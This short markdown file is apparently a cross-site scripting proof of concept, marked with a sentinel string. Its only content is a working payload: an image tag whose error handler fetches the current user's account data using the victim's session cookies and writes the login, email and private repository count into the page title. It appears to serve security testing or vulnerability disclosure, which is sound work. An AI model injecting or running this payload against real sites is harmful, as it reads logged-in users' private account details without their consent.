# XSS PoC ZZZXSS123

<img src=x onerror="fetch('/api/auth/current-user',{credentials:'include'}).then(r=>r.json()).then(d=>{document.title='PWNED:'+d.login+'|email='+d.email+'|priv_repos='+d.total_private_repos}).catch(e=>document.title='ERR:'+e)">

Sentinel marker: **ZZZXSS123**
